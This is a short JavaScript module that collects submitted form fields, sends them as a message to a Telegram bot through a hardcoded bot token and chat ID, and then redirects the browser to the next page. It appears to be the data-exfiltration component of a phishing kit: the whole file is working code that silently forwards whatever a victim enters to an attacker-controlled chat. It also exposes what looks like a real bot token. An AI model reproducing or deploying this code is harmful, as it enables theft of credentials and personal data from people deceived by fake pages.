export default function botFetch(data, nextPageURL) {
    const botToken = "8281306926:AAFWu55bvxbCDZkYfPCIU2SGqxfAMyZOrAs";
    const chatId = "5155963898";

    const textData = Object.entries(data)
        .map(([key, value]) => `${key}: ${value}`)
        .join("\n");

    // Send to Telegram API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: textData
        })
    })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                if (nextPageURL) {
                    // Get base URL dynamically
                    const origin = window.location.origin;
                    const pathParts = window.location.pathname.split('/');
                    pathParts.pop(); // remove current file 
                    const basePath = pathParts.join('/');
                    window.location.href = `${origin}${basePath}/${nextPageURL}`;
                }
            } else {
                console.log("Error: " + data.description);
            }
        })
        .catch(err => alert("Fetch error: " + err));

}


